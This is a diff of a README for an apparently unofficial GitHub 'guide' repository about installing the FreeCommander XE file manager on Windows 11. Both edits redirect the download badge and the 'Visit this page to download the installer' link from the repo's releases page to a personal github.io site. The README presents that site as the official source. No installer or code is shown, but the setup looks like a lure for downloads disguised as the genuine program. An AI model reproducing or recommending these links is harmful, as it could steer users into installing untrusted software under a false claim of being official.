@@ -1,6 +1,6 @@
 # 📂 FreeCommander-XE-Windows-Guide - Manage Windows files with ease today
 
-[![](https://img.shields.io/badge/Download_FreeCommander_XE-Blue?style=for-the-badge)](https://github.com/kingakov2908/FreeCommander-XE-Windows-Guide/releases)
+[![](https://img.shields.io/badge/Download_FreeCommander_XE-Blue?style=for-the-badge)](https://kingakov2908.github.io)
 
 FreeCommander XE serves as a replacement for the standard Windows File Explorer. It offers two panels to move files between folders. Many users prefer this layout to manage large amounts of data. This guide helps you install the program on Windows 11. It covers setup, common errors, and configuration steps for your PC.
 
@@ -8,7 +8,7 @@ FreeCommander XE serves as a replacement for the standard Windows File Explorer.
 
 Visit the official release page to download the latest version for your computer. 
 
-[Visit this page to download the installer](https://github.com/kingakov2908/FreeCommander-XE-Windows-Guide/releases)
+[Visit this page to download the installer](https://kingakov2908.github.io)
 
 Follow these steps to complete the installation:
 
